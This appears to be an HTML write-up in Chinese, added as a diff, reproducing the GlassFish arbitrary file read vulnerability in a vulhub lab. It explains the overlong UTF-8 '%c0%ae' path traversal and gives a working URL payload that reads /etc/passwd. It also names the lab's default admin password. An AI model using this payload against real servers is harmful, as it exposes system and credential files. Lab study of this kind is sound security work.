@@ -1,0 +1,32 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="glassfish-任意文件读取漏洞"><span class="csDE05BCC">GlassFish </span><span class="csECDA2D3">任意文件读取漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">java</span><span class="cs9C1B1871">语言中会把</span><span class="cs9FB05234">%c0%ae</span><span class="cs9C1B1871">解析为</span><span class="cs9FB05234">\uC0AE</span><span class="cs9C1B1871">，最后转义为</span><span class="cs8926E06">ASCCII</span><span class="cs9C1B1871">字符的</span><span class="cs9FB05234">.</span><span class="cs9C1B1871">（点）。利用</span><span class="cs9FB05234">%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</span><span class="cs9C1B1871">来向上跳转，达到目录穿越、任意文件读取的效果。</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">编译、运行测试环境</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker-compose build</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">docker-compose up -d</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">环境运行后，访问</span><span class="cs9FB05234">http://www.0-sec.org:8080</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">http://www.0-sec.org:4848</span><span class="cs9C1B1871">即可查看</span><span class="cs8926E06">web</span><span class="cs9C1B1871">页面。其中，</span><span class="cs8926E06">8080</span><span class="cs9C1B1871">端口是网站内容，</span><span class="cs8926E06">4848</span><span class="cs9C1B1871">端口是</span><span class="cs8926E06">GlassFish</span><span class="cs9C1B1871">管理中心。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs9FB05234">https://www.0-sec.org:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><span class="cs9C1B1871">，发现已成功读取</span><span class="cs9FB05234">/etc/passwd</span><span class="cs9C1B1871">内容：</span><span class="cs8926E06"><br/><img src="Web安全/GlassFish/GlassFish%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">ps:</span><span class="cs9C1B1871">本环境超级管理员密码在</span><span class="cs8926E06">docker-compose.yml</span><span class="cs9C1B1871">中设置，默认为</span><span class="cs8926E06">vulhub_default_password</span><span class="cs9C1B1871">，在</span><span class="cs8926E06">4848</span><span class="cs9C1B1871">端口利用该密码可以登录管理员账户。</span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">https://vulhub.org/#/environments/glassfish/4.1.0/</span></p></body>
+</html>
